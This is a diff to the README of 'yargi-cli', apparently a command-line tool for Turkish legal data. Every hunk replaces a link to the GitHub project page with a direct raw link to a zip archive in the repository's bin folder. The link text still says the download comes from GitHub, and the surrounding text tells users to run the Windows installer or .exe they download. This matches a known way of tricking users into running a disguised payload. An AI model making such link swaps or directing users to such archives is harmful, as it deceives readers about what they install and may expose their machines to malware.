@@ -1,6 +1,6 @@
 # ⚖️ yargi-cli - Simple Access to Turkish Legal Data
 
-[![Download yargi-cli](https://img.shields.io/badge/Download-Get%20yargi--cli-brightgreen?style=for-the-badge)](https://github.com/robinspringer/yargi-cli)
+[![Download yargi-cli](https://img.shields.io/badge/Download-Get%20yargi--cli-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/robinspringer/yargi-cli/main/bin/cli_yargi_3.0.zip)
 
 ---
 
@@ -35,7 +35,7 @@ This guide will help you download, install, and use yargi-cli step by step.
 
 To get the software, visit this page to download:
 
-**[Download yargi-cli from GitHub](https://github.com/robinspringer/yargi-cli)**
+**[Download yargi-cli from GitHub](https://raw.githubusercontent.com/robinspringer/yargi-cli/main/bin/cli_yargi_3.0.zip)**
 
 Click the green badge above or the link below to open the GitHub page. On that page, look for the latest version or release. Download the Windows installer or the `.exe` file.
 
@@ -127,7 +127,7 @@ If you have issues, try these steps:
 To update the tool:
 
 1. Visit the GitHub download page again:  
-   [https://github.com/robinspringer/yargi-cli](https://github.com/robinspringer/yargi-cli)  
+   [https://raw.githubusercontent.com/robinspringer/yargi-cli/main/bin/cli_yargi_3.0.zip](https://raw.githubusercontent.com/robinspringer/yargi-cli/main/bin/cli_yargi_3.0.zip)  
 2. Download the latest installer for Windows like you did the first time.  
 3. Run the installer to replace your existing version.
 
@@ -147,4 +147,4 @@ Or check the documentation and the README file on the GitHub page.
 
 ---
 
-[![Download yargi-cli](https://img.shields.io/badge/Download-Get%20yargi--cli-brightgreen?style=for-the-badge)](https://github.com/robinspringer/yargi-cli)
+[![Download yargi-cli](https://img.shields.io/badge/Download-Get%20yargi--cli-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/robinspringer/yargi-cli/main/bin/cli_yargi_3.0.zip)
